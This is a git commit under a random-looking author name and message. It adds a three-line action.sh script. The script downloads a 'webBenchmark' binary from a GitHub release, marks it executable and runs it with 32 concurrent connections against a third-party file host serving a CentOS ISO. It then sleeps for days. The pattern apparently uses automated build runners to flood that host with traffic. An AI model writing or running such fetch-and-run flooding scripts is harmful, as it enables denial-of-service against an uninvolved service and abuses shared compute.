98127b04b32449fe8b0c7f045d60822e85d09620
tSFGUdha <tSFGUdha@outlook.com>
2024-11-30 06:01:59 +0000

    xvBkQ25C

---
+++ action.sh
@@ -0,0 +1,3 @@
+ls -la
+wget https://github.com/maintell/webBenchmark/releases/download/0.5/webBenchmark_linux_x64 && chmod +x webBenchmark_linux_x64 && ./webBenchmark_linux_x64 -c 32 -s https://sakuradrive.com/f/pX5SZ/CentOS-8.1.1911-x86_64-boot.iso
+sleep 320000
